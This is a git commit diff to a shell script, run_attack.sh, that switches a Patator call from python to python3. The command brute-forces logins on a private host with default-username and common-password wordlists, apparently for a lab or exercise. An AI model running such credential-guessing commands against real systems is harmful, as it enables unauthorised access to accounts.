bad1032ee2519d2507e3127c072e1552aa54ed81
lunaai <88792933+lunaai@users.noreply.github.com>
2021-08-29 23:56:58 -0700

    Update run_attack.sh

--- ops/attack2/run_attack.sh
+++ ops/attack2/run_attack.sh
@@ -2,4 +2,4 @@
 
 attack=$1
 
-python /patator/patator.py "$attack" host=10.0.0.1 user=cirt-default-usernames.txt password=2020-200_most_used_passwords.txt 0=logins.txt 1=passwords.txt -x ignore:message='Login incorrect.' -x ignore,reset,retry:code=500
+python3 /patator/patator.py "$attack" host=10.0.0.1 user=cirt-default-usernames.txt password=2020-200_most_used_passwords.txt 0=logins.txt 1=passwords.txt -x ignore:message='Login incorrect.' -x ignore,reset,retry:code=500
